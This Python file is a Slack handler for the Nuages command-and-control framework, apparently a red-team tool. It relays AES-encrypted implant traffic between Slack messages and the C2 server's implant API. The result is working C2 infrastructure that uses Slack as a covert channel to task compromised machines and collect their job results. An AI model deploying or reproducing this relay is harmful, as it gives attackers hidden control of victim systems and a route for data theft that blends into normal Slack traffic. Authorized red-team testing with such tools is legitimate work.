import os
import slack_sdk as slack
import json
import base64
import hashlib
import requests
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import argparse
from flask import Flask, request
from slackeventsapi import SlackEventAdapter

class HTTPerror(Exception):
    def __init__(self, HTTPCode, HTTPContent):
        self.HTTPCode = HTTPCode
        self.HTTPContent = HTTPContent


class AESCipher(object):

    def __init__(self, key):
        self.bs = 32
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw)).decode('utf-8')

    def decrypt(self, enc):
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def _pad(self, s):
        return pad(s, AES.block_size, style='pkcs7')

    def _unpad(self, s):
        return unpad(s, AES.block_size, style='pkcs7')


def POST(url, body):
    headers = {'Content-type': 'application/json; charset=utf-8'}
    if args.id:
        headers["listener"] = args.id
    response = requests.post(connectionString + url, data=body.encode('utf-8'), verify=True, headers=headers)
    if response.ok:
        return response.content
    else:
        return str(response.status_code).encode('ascii')


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start an encrypted Nuages Slack handler')
    parser.add_argument("-t", "--token", required=True, help="The Slack bot token")
    parser.add_argument("-b", "--bot", required=True, help="The Slack bot ID")
    parser.add_argument("-s", "--secret", required=True, help="The Slack signing secret")
    parser.add_argument("-k", "--key", required=True, help="The seed for the encryption key")
    parser.add_argument("-u", "--uri", default="http://127.0.0.1:3030", help="The URI of the Nuages API")
    parser.add_argument("-p", "--port", type=int, help="The port to listen on", default=9320)
    parser.add_argument("-l", "--listen_ip", default="0.0.0.0", help="The IP address to listen on")
    parser.add_argument("-i", "--id", help="The listener ID for listener tracking")
    parser.add_argument("-q", "--quiet", action='store_true', help="Hide logs")
    args = parser.parse_args()

    app = Flask(__name__)

    aes = AESCipher(args.key)

    # The address of the Nuages C2 Server
    connectionString = args.uri + "/implant/"

    # The Slack token and bot ID
    slack_token = args.token
    bot_id = args.bot

    client = slack.WebClient(token=slack_token)

    slack_event_adapter = SlackEventAdapter(signing_secret=args.secret, endpoint="/slack/event-handler", server=app)

    @app.route('/slack/event-handler', methods=['POST'])
    def handle_event():
        return slack_event_adapter.handle(request)

    @slack_event_adapter.on('message')
    def processImplantMessage(payload):
        try:
            event = payload.get('event', {})
            if event.get("bot_id") != bot_id:
                channel_id = event.get('channel')
                thread_ts = event.get('event_ts')
                query = json.loads(event.get('text'))
                url = query["url"]

                if not args.quiet:
                    print(f"Received URL: {url}")

                body = aes.decrypt(base64.b64decode(query["body"]))

                if url == "jobresult":
                    POST(url, body)
                    return

                resp = aes.encrypt(POST(url, body))
                client.chat_postMessage(
                    channel=channel_id,
                    text=resp,
                    thread_ts=thread_ts
                )
        except Exception as e:
            print(e)
            pass

    app.run(debug=False, port=args.port, host=args.listen_ip)
